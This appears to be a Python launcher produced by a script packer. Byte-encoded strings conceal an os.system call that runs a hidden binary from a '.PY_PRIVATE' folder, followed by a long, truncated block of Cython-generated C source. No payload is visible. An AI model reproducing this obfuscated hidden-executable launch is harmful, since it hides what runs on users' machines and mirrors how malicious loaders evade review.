
import os
import sys

PSH_TEAM_KEY = bytes([216, 168, 216, 174, 32, 240, 159, 145, 128]).decode()

EXECUTE_FILE = bytes([46, 80, 89, 95, 80, 82, 73, 86, 65, 84, 69, 47, 50, 48, 50, 53, 48, 57, 48, 50, 48, 57, 51, 49, 48, 54, 50, 49, 51]).decode()
PREFIX = sys.prefix
EXPORT_PYTHONHOME = bytes([101, 120, 112, 111, 114, 116, 32, 80, 89, 84, 72, 79, 78, 72, 79, 77, 69, 61]).decode()+PREFIX
EXPORT_PYTHON_EXECUTABLE = bytes([101, 120, 112, 111, 114, 116, 32, 80, 89, 84, 72, 79, 78, 95, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 61]).decode()+sys.executable

RUN = bytes([46, 47]).decode()+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+bytes([32, 38, 38, 32]).decode()+EXPORT_PYTHON_EXECUTABLE+bytes([32, 38, 38, 32]).decode()+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
